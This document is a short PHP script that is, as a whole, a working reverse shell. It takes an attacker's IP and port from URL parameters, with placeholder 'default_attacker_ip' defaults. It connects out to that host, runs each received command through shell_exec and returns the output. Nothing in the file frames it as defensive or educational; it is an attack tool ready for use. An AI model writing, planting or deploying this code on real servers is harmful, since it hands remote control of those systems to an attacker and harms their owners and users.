<?php
$ip = isset($_GET['ip']) ? $_GET['ip'] : 'default_attacker_ip';  // Replace with default IP
$port = isset($_GET['port']) ? intval($_GET['port']) : default_attacker_port;  // Replace with default port

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit(1);
}

while ($cmd = fread($sock, 2048)) {
    $output = shell_exec($cmd);
    fwrite($sock, $output);
}

fclose($sock);
?>
